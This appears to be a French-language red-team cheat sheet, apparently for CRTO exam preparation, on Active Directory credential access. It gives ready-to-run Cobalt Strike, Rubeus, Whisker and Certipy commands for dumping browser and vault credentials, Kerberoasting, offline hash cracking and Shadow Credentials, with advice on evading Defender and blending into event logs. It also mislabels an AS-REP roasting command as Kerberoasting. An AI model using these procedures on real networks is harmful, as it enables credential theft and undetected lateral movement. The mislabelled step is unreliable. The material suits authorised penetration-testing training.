# Credential Access — Accès aux identifiants  

* Récupérer les credentials des navigateurs Web
```
execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

* Windows Credential Manager   
```
run vaultcmd /listcreds:"Windows Credentials" /all
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```

## Kerberoasting

> Demander des tickets **TGS** pour les comptes disposant d’un **SPN**, puis effectuer le cracking hors ligne. Aucun accès à LSASS ni privilège administrateur requis.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
```

> Mode Hashcat `18200` (AS-REP Roasting).  

```
.\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
```

### Prérequis

- Disposer d’un compte utilisateur du domaine valide, même sans privilège particulier.
- Le compte cible doit avoir un attribut `servicePrincipalName` renseigné.
- Les hashes **RC4** (type 23) sont généralement plus rapides à cracker ; les comptes AES-only produisent un type 18, plus lent.

---

### Étape 1 — Pré-énumération des SPN

> **Attention aux honeypots :** les environnements d’examen peuvent contenir des comptes leurres avec un SPN.
> Énumérer d’abord tous les comptes **kerberoastable**, puis identifier les comptes de service suspects
> (nom générique, absence de connexion, description « do not use ») et **les exclure**.
> Un Kerberoasting sur un compte honeypot peut déclencher une alerte et faire perdre des points OPSEC.

#### LDAP Search — OPSEC-SAFE, sans `krbtgt` ni comptes désactivés

```sh
// Enumerate all valid kerberoastable accounts — excludes krbtgt and disabled accounts
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
```

Explication des filtres :
- `samAccountType=805306368` — comptes utilisateurs uniquement
- `servicePrincipalName=*` — SPN obligatoirement renseigné
- `!samAccountName=krbtgt` — exclusion du compte `krbtgt`
- `UserAccountControl:...=2` — exclusion des comptes désactivés

#### .NET ADSI natif — OPSEC-SAFE, sans outil externe

```cs
// No PowerView, no imports — works on any beacon immediately
beacon> powerpick ([adsisearcher]"(&(objectCategory=user)(servicePrincipalName=*))").FindAll() | ForEach-Object { $_.Properties['samaccountname']; $_.Properties['serviceprincipalname'] }

// Target specific account
beacon> powerpick ([adsisearcher]"(samaccountname=mssql_svc)").FindOne().Properties | Format-List
```

#### PowerView — nécessite d’abord `powershell-import`

```cs
beacon> powerpick Get-DomainUser mssql_svc -Properties samaccountname,serviceprincipalname,description
beacon> powerpick Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,lastlogon
```

---

### Étape 2 — Charger PowerView dans la mémoire du Beacon

**`powershell-import`** charge le fichier depuis le disque local du client Cobalt Strike, sans l’écrire sur la cible.

```cs
// Step 1 — one-time per beacon session (path = CS client machine filesystem)
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

// Step 2 — all subsequent powerpick calls have PowerView loaded
beacon> powerpick Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
```

**Dépannage :** erreur `powershell-import` « not found »

```
Cause:   Path in powershell-import refers to CS CLIENT machine, not beacon host
         Verify file exists on attacker desktop before importing
Fix 1:   Confirm path — run 'dir C:\Tools\PowerSploit\Recon\PowerView.ps1' on attacker desktop directly
Fix 2:   Find actual path — dir C:\Tools\ /s /b | findstr PowerView  (on attacker desktop)
Fix 3:   Fallback to native .NET ADSI query — no imports needed (see above)
Avoid:   DO NOT upload PowerView.ps1 to target — .ps1 is heavily signatured, Defender flags on write
```

---

### Étape 3 — Kerberoasting avec Rubeus

```cs
// OPSEC-SAFE — target specific user, single-line output for submission
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

// All kerberoastable accounts
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /nowrap

// RC4 downgrade — force type 23 hash (faster to crack) if AES supported
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /tgtdeleg /nowrap
```

Format du hash retourné : conserver la sortie telle quelle (les notes indiquent que le portail d’examen accepte la troncature).

```
$krb5tgs$23$*mssql_svc$DOMAIN$<SPN>*$<hash>
```

---

### Cracking hors ligne (Kali)

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

### Vérifications OPSEC préalables

```
Tier:          SAFE
Spawns proc:   Yes — sacrificial process via execute-assembly (fork & run)
Touches LSASS: No
Writes disk:   No — hash returned to beacon console only
Event logs:    4769 (Kerberos TGS Request) on DC — unavoidable, blend with normal traffic
EDR telemetry: .NET assembly loaded in sacrificial process; TGS RC4 request may alert
Defender sig:  Rubeus binary is known — pre-staged in CRTO lab, confirmed working
─────────────────────────────────────────────────
Safer alternative: Inline BOF kerberoast (if available) avoids fork & run process spawn entirely
Avoid:         shell setspn -Q */* — spawns cmd.exe as beacon child
Avoid:         Uploading PowerView.ps1 to target disk — Defender flags immediately
```

### Comparaison OPSEC des méthodes d’énumération

| Méthode | Nouveau processus | powershell.exe | Écriture disque | Risque Defender |
|--------|-------------|----------------|-------------|---------------|
| `powerpick` ADSI .NET natif | Oui (temporaire) | Non | Non | Faible |
| `powershell-import` + `powerpick` PowerView | Oui (temporaire) | Non | Non (client CS seulement) | Faible |
| `execute-assembly` ADSearch | Oui (temporaire) | Non | Non | Faible |
| `shell setspn -Q */*` | Oui — child process `cmd.exe` | Non | Non | Élevé |
| `upload` PowerView.ps1 + dot-source | Oui | Non | Oui — disque cible | Élevé — signature |

---

## Shadow Credentials

> Exploite les droits d’écriture sur `msDS-KeyCredentialLink` dans Active Directory (attribut également utilisé par Windows Hello for Business). Ajout d’une clé → authentification **PKINIT** → récupération du hash NT, sans changer le mot de passe ni accéder à LSASS.

### Prérequis

- Disposer d’un droit d’écriture sur l’attribut `msDS-KeyCredentialLink` de l’objet cible :
  `GenericWrite` / `GenericAll` / `WriteProperty` / `WriteDacl` / `WriteOwner`
- Le Domain Controller doit prendre en charge **PKINIT** (authentification Kerberos par certificat).
- Domain Functional Level 2016 ou supérieur.

> Requête BloodHound pour trouver les cibles :
> ```cypher
> MATCH (n)-[r:GenericWrite]->(m:User) RETURN n,r,m
> MATCH (n)-[r:GenericWrite]->(m:Computer) RETURN n,r,m
> ```

### Déroulement de l’attaque

```
1. Add attacker key credential → msDS-KeyCredentialLink of target object
2. Authenticate as target via PKINIT using the key pair → receive TGT
3. Use TGT + Kerberos U2U → extract target NT hash
4. PTH or use TGT directly for lateral movement
```

### Exécution — Cobalt Strike (`OPSEC-CAUTION`)

```cs
// Step 1 — add shadow credential (Whisker outputs a ready-to-run Rubeus command)
beacon> execute-assembly Whisker.exe add /target:targetuser

// Step 2 — authenticate via PKINIT, get TGT and NT hash in one shot
beacon> execute-assembly Rubeus.exe asktgt /user:targetuser /certificate:<b64cert> /password:<certpass> /getcredentials /show /nowrap

// Step 3 — use TGT (pass-the-ticket)
beacon> execute-assembly Rubeus.exe ptt /ticket:<b64ticket>

// Cleanup — always remove your key after use
beacon> execute-assembly Whisker.exe list /target:targetuser
beacon> execute-assembly Whisker.exe remove /target:targetuser /deviceid:<guid>
```

### Exécution — Adaptix / Kali (`OPSEC-CAUTION`)

```bash
# Step 1 — add shadow credential
pywhisker.py -d DOMAIN -u attacker -p 'pass' --target targetuser --action add

# Step 2 — PKINIT auth → get TGT
gettgtpkinit.py DOMAIN/targetuser -cert-pfx cert.pfx -pfx-pass <pass> targetuser.ccache
export KRB5CCNAME=targetuser.ccache

# Step 3 — extract NT hash from TGT
getnthash.py DOMAIN/targetuser -key <aes-key-from-gettgtpkinit>

# All-in-one via Certipy (cleanest from Kali)
certipy shadow auto -u attacker@DOMAIN -p 'pass' -account targetuser
# Outputs NT hash directly

# Cleanup
pywhisker.py -d DOMAIN -u attacker -p 'pass' --target targetuser --action remove --device-id <guid>
```

### Vérifications OPSEC préalables

```
Tier:          CAUTION
Spawns proc:   Yes — sacrificial process via execute-assembly (fork & run)
Touches LSASS: No
Writes disk:   No — cert handled in-memory by Rubeus
Event logs:    5136 (msDS-KeyCredentialLink modification)
               4768 (TGT requested via PKINIT / cert auth)
EDR telemetry: LDAP write to sensitive attribute; anomalous cert-based TGT
Defender sig:  Whisker binary is known — obfuscate or use pyWhisker from Kali
Safer alt:     Run from Kali with pyWhisker/Certipy to avoid CS binary on disk
```

### Tools

| Outil | Langage | Exécution depuis |
|------|----------|-------------|
| Whisker | C# | `execute-assembly` |
| pyWhisker | Python | Kali shell |
| Certipy (`shadow auto`) | Python | Kali shell — all-in-one |

### Quand utiliser cette technique

- L’utilisateur ou l’ordinateur cible n’a pas de SPN, mais un droit d’écriture ACL est disponible sur son objet.
- N’implique ni dump LSASS ni création de service ; son profil de détection est différent.
- Utile lors d’un pivoting impliquant des délégations mal configurées ou des comptes machines contrôlés.
- Shadow Credentials sur un compte machine → hash NT de la machine → chemins RBCD ou S4U2Self.

---

